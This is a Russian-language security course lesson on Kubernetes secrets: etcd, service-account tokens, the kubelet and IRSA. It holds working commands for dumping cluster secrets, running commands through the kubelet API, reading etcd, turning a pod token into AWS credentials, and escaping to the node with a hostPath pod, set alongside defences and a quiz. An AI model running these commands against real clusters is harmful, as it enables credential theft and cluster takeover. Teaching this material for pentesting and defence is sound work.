---
id: cloud-k8s-secrets
title: "Секреты Kubernetes: etcd, SA-токены и кража данных кластера"
category: cloud
parent: cloud-kubernetes-rbac
difficulty: hard
order: 1
tags: [cloud, kubernetes, secrets, etcd, serviceaccount, token, kubelet]
prerequisites: [cloud-kubernetes-rbac]
useful_for:
  - "Кража секретов Kubernetes"
  - "Понимание etcd и SA-токенов"
  - "Эксплуатация kubelet и etcd endpoints"
estimated_minutes: 35
summary: "Где хранятся секреты в Kubernetes, как читать их через API, kubelet и etcd, и как захватывать service-account токены. Практические команды и типовые мисконфиги."
---
## Зачем этот урок

Секреты Kubernetes (пароли, токены, ключи) — главная цель в кластере. Они лежат в etcd, монтируются в поды и выдаются сервис-аккаунтам. Понимание того, где живут секреты и как до них добраться, превращает доступ к одному поду в компрометацию всего кластера.

## Где живут секреты

- **etcd** — основной store, хранит всё (в т.ч. Secret-объекты).
- **ServiceAccount-токены** — JWT, монтируются в `/var/run/secrets/kubernetes.io/serviceaccount/token`.
- **kubelet** — на каждой ноде, отдаёт API `/pods`, `/exec`, `/logs`.
- **Secret-объекты** — доступны через API, если есть RBAC-права.
- **Переменные окружения** подов — часто содержат те же секреты.
- **Облачные секреты** — Secrets Manager/Key Vault через CSI-драйверы.

## Чтение секретов через API

```bash
kubectl get secrets -A
kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d
kubectl describe secret db-creds -n prod
# изнутри пода
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$TOKEN get secrets -A
```

Права проверяются через `kubectl auth can-i get secrets --as=system:serviceaccount:ns:sa`.

## kubelet: часто забытый вход

kubelet слушает 10250 (и 10255 без аутентификации в старых версиях). С токеном SA можно:

```bash
curl -k https://NODE:10250/pods -H "Authorization: Bearer $TOKEN"
curl -k https://NODE:10250/run/<ns>/<pod>/<container> -d "cmd=id" \
  -H "Authorization: Bearer $TOKEN"
```

Анонимный доступ (`--anonymous-auth=true`) или `AlwaysAllow`-авторизация открывают RCE на ноде.

## etcd: сердце кластера

etcd на 2379/2380. Если доступен без клиентских сертификатов:

```bash
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt get / --prefix --keys-only
etcdctl get /registry/secrets/default/db-creds
```

В etcd лежат ВСЕ секреты кластера, включая токены и сертификаты.

## Разобранный пример: от пода к секретам кластера

1. Внутри пода читаем SA-токен.
2. `kubectl auth can-i --list --token=$TOKEN` — что разрешено.
3. Если `get secrets` — выгружаем все секреты.
4. Если `create pods` — монтируем hostPath `/` и получаем ноду.
5. С ноды читаем kubelet-конфиги и `/etc/kubernetes/pki`.
6. Получаем доступ к etcd и админ-сертификаты.

## Кража SA-токенов

Токены SA по умолчанию монтируются в поды (до K8s 1.24 автоматом, позже — через projected volume). Их можно украсть через SSRF приложения, `exec` в под, или чтение env. Долгоживущие токены (legacy) особенно опасны. `automountServiceAccountToken: false` снижает риск.

## Защита

- Включить шифрование etcd at-rest (`EncryptionConfiguration`).
- RBAC least privilege, запрет `get secrets` для неадминов.
- Отключить анонимный доступ к kubelet, включить `Webhook`-авторизацию.
- `automountServiceAccountToken: false` где не нужно.
- OIDC/Workload Identity вместо долгоживущих токенов.
- Аудит-логи API-сервера.

## Частые ошибки

- Считать, что Secret — «защищённый»: по умолчанию он лишь base64.
- Игнорировать kubelet как вектор.
- Не проверять, зашифрован ли etcd.
- Забывать, что любой, кто читает Secret, читает и данные, и часто — облачные креды.
- Путать RBAC-права пода и пользователя.

## Что дальше / решение

От SA-токена двигайтесь к: (1) секретам кластера, (2) побегу на ноду (privileged/hostPath), (3) облачным креды через IRSA. Для защиты — шифрование, строгий RBAC и отключение анонимного kubelet.

## IRSA и Workload Identity

В EKS поды получают AWS-креды через IRSA: SA связан с IAM-ролью через OIDC. Токен SA (projected, с audience `sts.amazonaws.com`) обменивается на временные AWS-креды. Если украсть такой токен, можно встать на роль:

```bash
# изнутри пода с IRSA
TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::111122223333:role/EksPodRole \
  --role-session-name pod --web-identity-token $TOKEN
```

В GKE аналог — Workload Identity (`iam.gke.io/gcp-service-account`), в AKS — workload identity federation.

## Секреты: env vs volume

- **env** — видны в `/proc/<pid>/environ`, `docker inspect`, логах приложения.
- **volume** — файлы в tmpfs, меньше утечек в логи, но всё равно читаемы процессом.
- **CSI Secret Store** — секреты из облачного хранилища монтируются как файлы и часто кэшируются.

При компрометации пода читайте и env, и смонтированные файлы, и облачные секреты через CSI.

## Инструменты аудита

```bash
kube-bench run --targets=master,node        # CIS-бенчмарк
kube-hunter --remote <cluster>               # внешняя проверка
kubectl auth can-i --list --as=system:serviceaccount:ns:sa
kubectl get rolebindings,clusterrolebindings -A -o wide
peirates                                       # интерактивный эксплойт-фреймворк
```

`kube-bench` флаги: `--targets`, `--benchmark`, `--json`. `kube-hunter` флаги: `--remote`, `--cidr`, `--active`.

## Разобранный пример: Secret → облачные креды

1. Из пода читаем SA-токен и проверяем права.
2. `kubectl get secrets -A -o yaml` — находим `aws-creds` (если есть права).
3. Внутри — `AWS_ACCESS_KEY_ID`/`SECRET`, ведущие в аккаунт.
4. `aws sts get-caller-identity` → определяем роль.
5. `enumerate-iam` → ищем эскалацию.
Так K8s-секрет превращается в облачный доступ.

## Разобранный пример: побег к ноде

Если есть `create pods` в namespace с ослабленным PSA:

```bash
kubectl run pwn --image=alpine --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine",
  "command":["/bin/sh","-c","sleep 100000"],
  "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
  "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
kubectl exec -it pwn -- chroot /host /bin/sh
```

С ноды — доступ к kubelet, `/etc/kubernetes/pki`, облачным метаданным.

## Чек-лист защиты

- [ ] etcd зашифрован at-rest.
- [ ] RBAC: минимум `get secrets`, нет wildcard.
- [ ] kubelet: `anonymous-auth=false`, webhook-авторизация.
- [ ] `automountServiceAccountToken: false` где возможно.
- [ ] PSA restricted для пользовательских namespace.
- [ ] Аудит-логи включены и хранятся неизменно.

## Аудит RBAC на wildcard

Опасные конфигурации: `ClusterRole` с `resources: ["*"]`, `verbs: ["*"]` или `secrets` с `get/list`. Проверка:

```bash
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].resources[]?=="secrets") | .metadata.name'
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'
kubectl auth can-i get secrets --as=system:serviceaccount:default:default
```

Сервис-аккаунт `default` часто имеет право читать собственный токен, но не секреты. Ищите SA, привязанные к `cluster-admin` или к ролям с `secrets`.

## Секреты в GitOps

ArgoCD/Flux хранят манифесты в Git. Если Secret закоммичен (даже base64) — он утёк. Sealed Secrets и SOPS шифруют, но ключ расшифровки может лежать в кластере. Проверяйте: (1) историю Git на секреты, (2) права на SealedSecrets-ключ, (3) доступ к репозиторию. `git log -p | grep -i secret` и trufflehog/gitleaks по репозиторию быстро выявляют утечки.

## Сводная таблица векторов

| Вектор | Что даёт | Митигация |
|--------|----------|-----------|
| SA-токен в поде | права SA, часто облачные креды | automount off, RBAC least-priv |
| get secrets | все секреты namespace | запрет get/list secrets |
| kubelet 10250 без auth | RCE на ноде | anonymous-auth off, webhook |
| etcd без TLS | все секреты кластера | клиентские сертификаты, шифрование |
| privileged/hostPath | побег к ноде | PSA restricted, admission |
| CI/CD → cluster | деплой вредоносного пода | ограничить SA пайплайна |

## Секреты в переменных и файлах

Секреты монтируются либо как env (видны в `/proc/<pid>/environ`), либо как файлы в tmpfs. При компрометации пода проверьте оба места и облачные секреты через CSI. Для защиты — предпочитайте файлы (меньше утечек в логи) и `automountServiceAccountToken: false`.

## Квиз

```quiz
- question: "Где хранится «истина» о секретах Kubernetes?"
  options:
    - "В kubelet"
    - "В etcd"
    - "В Docker"
    - "В Route 53"
  answer: 1
  explanation: "etcd — хранилище состояния кластера, включая Secret."
- question: "По какому пути в поде монтируется токен service account?"
  options:
    - "/etc/passwd"
    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
    - "/root/.kube"
    - "/tmp/token"
  answer: 1
  explanation: "SA-токен монтируется по этому стандартному пути."
- question: "Какой порт слушает kubelet и часто открыт без аутентификации?"
  options:
    - "2379"
    - "10250"
    - "6443"
    - "8080"
  answer: 1
  explanation: "10250 — основной API kubelet; 10255 — read-only."
- question: "Почему открытый etcd (2379) критичен?"
  options:
    - "Он только для метрик"
    - "Он отдаёт всё состояние кластера, включая секреты"
    - "Он для DNS"
    - "Он шифрует трафик"
  answer: 1
  explanation: "etcd содержит все объекты кластера, включая Secret."
- question: "Чем legacy SA-токены опаснее projected?"
  options:
    - "Они короче"
    - "Они долгоживущие и хранятся как Secret, что удобно для персистентности"
    - "Они шифруются"
    - "Они не существуют"
  answer: 1
  explanation: "Legacy-токены не истекают автоматически — идеальная персистентность."
```

## Где пригодится

- **Пентест Kubernetes** — кража секретов и кредов.
- **Red team** — закрепление в кластере.
- **IR/Blue team** — детект доступа к Secret и kubelet.
- **DevSecOps** — шифрование etcd, внешние секрет-менеджеры.
- **Сертификации** — CKS.
